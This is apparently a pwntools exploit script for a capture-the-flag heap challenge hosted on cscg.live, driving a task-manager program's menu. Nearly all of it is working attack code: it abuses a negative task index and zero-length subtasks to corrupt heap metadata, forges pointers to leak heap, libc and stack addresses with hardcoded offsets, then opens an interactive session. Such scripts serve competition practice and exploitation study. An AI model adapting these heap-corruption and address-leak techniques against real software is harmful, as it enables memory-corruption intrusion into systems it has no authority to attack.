#!/bin/python
from pwn import remote, process, ELF,context
from pwnlib import gdb
import string
import sys

context.terminal="/bin/kitty"

target=ELF("./main")
libc=ELF("target_libc.so.6")
CN=None
#CN = remote("172.17.0.2", 1024)
CN = remote("73ac3c99646d9ad447d74dcc-intro-heap-2.challenge.master.cscg.live", 31337, ssl=True)
p=target.process()
if isinstance(p, process) and CN is None:
    print("isproces")
    CN=p
elif CN is None:
    sys.exit()

PROMPT=b"choice?"

def createTask(name:str):
    CN.send(b"1\n")
    CN.send(name.encode('ascii')+b"\n")
    response=CN.recvuntil(PROMPT)
    #print(response)

def deleteTask(mainTaskId:int):
    CN.send(b"2\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    CN.recvuntil(PROMPT)

def listTask():
    CN.send(b"3\n")
    response=CN.recvuntil(PROMPT)
    r1=response.split(b"---menu---")[0].split(b"\n")
    tasks={}
    for i in range(len(r1)-1):
        pair=r1[i].split(b"] ")
        tasks[int(pair[0][-2:])]=pair[1]
        #tasks.append(r1[i].split(b"] ")[1])
    #print(tasks)
    return tasks

def createSubTask(content, mainTaskId:int, length=None):
    if length==None:
        length=len(content)+1
    CN.send(b"4\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    CN.send(str(length).encode('ascii')+b"\n")
    if isinstance(content,str):
        contentmsg=content.encode('ascii')
    elif isinstance(content, bytes):
        contentmsg=content
    else:
        contentmsg=None
        print("Wrong content type")
    if contentmsg is not None:
        if length!=0:
            CN.send(contentmsg+b"\n")
    CN.recvuntil(PROMPT)



def deleteSubTask(mainTaskId:int, subTaskId:int):
    CN.send(b"5\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    CN.send(str(subTaskId).encode('ascii')+b"\n")
    CN.recvuntil(PROMPT)

def listSubTask(mainTaskId:int)->dict[int, bytes]:
    CN.send(b"6\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    response = CN.recvuntil(PROMPT)
    r1=response.split(b"---menu---")[0].split(b"\n")
    tasks={}
    for i in range(len(r1)-1):
        pair=r1[i].split(b"] ")
        tasks[int(pair[0][-2:])]=pair[1]
        # tasks.append(r1[i].split(b"] ")[1])
    #print(tasks)
    return tasks

def main():
    #pid=int(input("Enter pid: ").strip())
    
    #g=gdb.attach(p)
    CN.recvuntil(PROMPT)
    charset=string.ascii_lowercase

    for i in range(6):
        createSubTask(charset[i]*3,-11)#,0x99)
        #createSubTask(charset[i]*15,0,0x99)
    createSubTask("",-11,255)
    createSubTask("",-11,0)
    createSubTask("",0,0)
    createSubTask("",0,0)
    createSubTask("",0,0)
    createSubTask("",0,0)
    createSubTask("",1,0)
    createSubTask("",1,0)
    createSubTask("",1,0)
    createSubTask("",1,0)
    r=listSubTask(0)
    heapBaseAddress=int(r[0][::-1].hex(),16)-0x550
    print(hex(heapBaseAddress))
    for i in range(10):
        createSubTask(str(i)*0x90,0)
    for i in range(8):
        deleteSubTask(0,i+4)
    createSubTask(b"\x00"*8+(heapBaseAddress+0xa60).to_bytes(8,'little')+b"\x00"*8*23,-11,255)
    r=listSubTask(2)
    libcBaseAddress=int(r[0][::-1].hex(),16)-0x219D80
    print(hex(libcBaseAddress))
    createSubTask(b"\x00"*8+(libcBaseAddress+0x2211f9).to_bytes(8,'little')+b"\x00"*8*23,-11,255)
    r=listSubTask(3)
    stackAddress=int(r[0][::-1].hex(),16)
    print(hex(stackAddress))
    stackAddress=int(input("please enter the begin of environment stack pages"))
    createSubTask(b"\x00"*8+(stackAddress+0xfe3-0x24).to_bytes(8,'little')+b"\x00"*8*23,-11,255)
    r=listSubTask(4)
    print(r)
    CN.interactive()
    #rint(CN.recvuntil(PROMPT))
    #deleteSubTask(2,0)
    #deleteSubTask(2,1)
    #deleteSubTask(2,3)
    #    deleteTask(1)
    #createTask("B"*15)
    #createSubTask("1"*15,1)
    #heapaddr=bytes.fromhex(input("Enter heap addr: "))
    #reversedHeap=heapaddr[::-1]
    #createSubTask(reversedHeap,0)
    #print(reversedHeap.hex())
    #deleteSubTask(0,2)
    #deleteSubTask(0,4)
    #deleteSubTask(0,6)
    for i in range(44):
        createTask("A"*15)
    for i in range(24):
        deleteSubTask(0,24-i)
    
    createSubTask(str(0)[0]*15,0)
    
    for i in range(42):
        deleteTask(i+1)
    

    createSubTask("fweef",0)
    createSubTask("sefefeef",0)
    print(listTask())
    print(listSubTask(0))
    deleteSubTask(0,0)
    print(listSubTask(0))
    print("entering interactive mode")


if __name__=="__main__":
    main()
    CN.close()